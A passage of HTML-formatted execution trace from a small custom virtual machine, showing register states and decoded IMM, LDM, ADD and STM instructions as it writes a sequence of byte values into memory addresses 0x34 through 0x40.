class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x48</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0x98</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x49</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x34</span> b:<span class="hljs-number">0x98</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x35</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x35</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0x98</span> c:<span class="hljs-number">0x98</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x46</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x46</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0x98</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0x46</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x35</span> b:<span class="hljs-number">0x46</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x4f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x36</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x36</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0x46</span> c:<span class="hljs-number">0x46</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x50</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x63</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x63</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0x46</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x51</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x52</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0x63</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x53</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x36</span> b:<span class="hljs-number">0x63</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x54</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x37</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x37</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0x63</span> c:<span class="hljs-number">0x63</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x55</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xe1</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xe1</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0x63</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x56</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x57</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0xe1</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x58</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x37</span> b:<span class="hljs-number">0xe1</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x59</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x38</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x38</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0xe1</span> c:<span class="hljs-number">0xe1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x48</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x48</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0xe1</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0x48</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x38</span> b:<span class="hljs-number">0x48</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x39</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x39</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0x48</span> c:<span class="hljs-number">0x48</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x5f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x37</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x37</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0x48</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x60</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x61</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0x37</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x62</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0x37</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x63</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3a</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3a</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0x37</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x64</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x3e</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x3e</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0x37</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x65</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x66</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0x3e</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x67</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0x3e</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x68</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3b</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3b</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0x3e</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x69</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x7f</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x7f</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0x3e</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0x7f</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0x7f</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3c</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3c</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0x7f</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xc1</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xc1</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0x7f</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x70</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0xc1</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x71</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0xc1</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x72</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3d</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3d</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0xc1</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x73</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xfa</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xfa</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0xc1</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x74</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x75</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0xfa</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x76</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0xfa</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x77</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3e</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3e</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0xfa</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x78</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x53</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x53</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0xfa</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x79</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0x53</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0x53</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3f</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3f</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0x53</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x5f</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x5f</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0x53</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0x5f</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x80</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0x5f</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x81</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x40</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span class="hljs-number">0x5f</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x82</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x99</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x99</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span 